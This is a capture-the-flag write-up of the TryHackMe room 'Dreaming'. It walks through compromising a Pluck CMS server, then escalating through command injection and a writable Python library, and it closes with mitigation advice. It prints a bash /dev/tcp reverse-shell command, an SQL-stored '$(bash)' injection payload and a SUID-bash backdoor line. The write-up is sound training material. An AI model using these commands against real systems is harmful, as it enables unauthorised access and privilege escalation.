---
title: "TryHackMe - Dreaming"
author: Nasrallah
description: ""
date: 2023-12-10 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, commandinjection, cve, python, cronjob, sudo, mysql]
img_path: /assets/img/tryhackme/dreaming
image:
    path: dreaming.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **Description:**

[Dreaming](https://tryhackme.com/room/dreaming) from [TryHackMe](https://tryhackme.com) has a CMS vulnerable to file upload that leads to command execution. On the machine we find multiple files that contains clear text passwords, we also find a script vulnerable to command injection which we used to escalate horizontally. Another script we found calls a library we have write permission over so we exploit it to complete the machine.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.137.113
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have ssh on port 22 and Apache on port 80.

### Web

Let's navigate to the web page:

![webpage](1.png)

That's Apache default page.

#### feroxbuster

Let's run a directory scan and see what we can find.

```terminal
┌──(sirius㉿kali)-[~/CTF/THM]
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.10.137.113/ -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.137.113/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.10.137.113/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.10.137.113/
301      GET        9l       28w      312c http://10.10.137.113/app => http://10.10.137.113/app/
[####################] - 80s    20483/20483   0s      found:3       errors:6      
[####################] - 80s    20477/20477   257/s   http://10.10.137.113/                   
```

We found `/app`.

![app](2.png)

This has directory listing on so we can see another directory with the name `pluck-4.7.13`.

![pluck](3.png)

Clicking on `admin` sends us to a login page.

![login](4.png)

This page only asks us for a password, I tried some default ones like `admin` and `password` and managed to login with the latter.

![pass](5.png)

Let's see if we can find any exploit in this version of `pluck`.

```terminal
searchsploit pluck 4.7.13
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                                                            | php/webapps/49909.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This is vulnerable to File Upload that leads to remote code execution.

## **Foothold**

Let's copy the exploit to our working directory with `searchsploit -m php/webapps/49909.py`

Checking the script we find it requires 4 arguments, `target_ip` `target_port` `password` and `pluckcmspath`.

The final command will look like this:

```bash
python3 49909.py 10.10.137.113 80 password /app/pluck-4.7.13
```

Let's run it.

```terminal
$ python3 49909.py 10.10.137.113 80 password /app/pluck-4.7.13

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.137.113:80/app/pluck-4.7.13/files/shell.phar
```

That was successful, now let's go to the shell page.

![shell](6.png)

Now let's get a reverse shell by running the following command on the webshell:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.8.238.231/9001 <&1'
```

> Change the ip address in the command

![revshell](7.png)

## **Privilege Escalation**

### www-data -> lucien

Checking the `/opt` directory we find two files.

![password](8.png)

We found a password that might belong to user `lucien`.

Let's try ssh as `lucien` with the password.

![ssh](9.png)

That was successful.

### lucien -> death

let's check our privileges:

```terminal
lucien@dreaming:~$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

We can run a python script as user death.

There is a copy of `getDreams.py` in the /opt directory but it's missing a password.

The script seems to connect to the mysql database and retrieves some data.

```terminal
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

Checking the source code we find more information on how the script works:

```python
query = "SELECT dreamer, dream FROM dreams;"                                                                                                                                         
                                                                                                                                                                                             
        # Execute the query                                                                                                                                                                  
        cursor.execute(query)                                                                                                                                                                
                                                                                                                                                                                             
        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()
                                               
        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

```

After connecting to Mysql and the `Library` database, it queries a table called `dreams` for two columns `dreamer` and `dream` (`Bob` `Exploring ancient ruins`).

In a for loop `for dream_info in dreams_info` it keeps pulling data and stores it in a shell command that uses `echo` to print the output.

Here we can see a clear command injection vulnerability.

But we need a way to connect to the database and add our malicious data.

On `lucien`'s home directory we notice that the history file is not empty.

![historyfile](10.png)

We found credentials for mysql, let's connect.

```terminal
lucien@dreaming:~$ mysql -u lucien -plucien42DBPASSWORD
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use library;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select dreamer, dream FROM dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)

mysql>

```

Now we need to add our code.

```sql
INSERT INTO dreams (dreamer, dream) VALUES ("injection", "$(bash)");
```

![injection](11.png)

Great! Now exit mysql and run the sudo command.

![sudo](12.png)

We got a shell as `death` but we're not getting any output from the commands we run.

Since the getDreams.py has a password of `death` and printed it and piped it to `wall` which writes a message to all user hoping a would get it in the first shell but just got in the current one and managed to read the password.

> I got a new ssh shell as lucien and tried this trick again and got the message, maybe because the reverse shell was missing something and didn't get the shell.

![wall](13.png)

Now we run `su death` and submit the password.

### death -> morpheus

Let's check `morpheus`'s home directory

![morpheushome](14.png)

There is a python script that seems to be taking a backup of the kingdom file.

```python
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

I run `pspy64` to see if there is a cronjob running the file.

![pspy](15.png)

We confirmed there is a cronjob.

We see the script is using the `shutil` library. Let's locate it and see if we can modify it.

![library](16.png)

Great! We have write permission over it.

Let's add a python reverse shell to the file.

```python
os.system("cp /bin/bash /home/morpheus/bash && chmod +s /home/morpheus/bash")
```

![suid](17.png)

This will create a copy of bash with suid bit on morpheus's home directory

![suidbash](18.png)

We got a shell as morpheus.

## **Prevention and Mitigation**

### Default credentials

We were able to login because the password was easy to guess.

Default passwords should be changed to a strong and hard to guess password

### Pluck 4.7.13

This version of `Pluck` is vulnerable to file upload so it needs to be updated to a newer version.

### Plaintext password

We found three plain text passwords on the system, two of them belong to user `lucien` and the other to user `death`.

Passwords should never be stored in plain text but rather hashed using strong algorithms.

### Command injection

getDreams.py script is vulnerable to command injection. It's better to use libraries to carry out actions instead of calling OS commands directly

### Python library

We were able to edit the `shutil` library which was being called in the restore.py script.

User death has write permission which is unnecessary for the script to run properly and the permission should be revoked.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
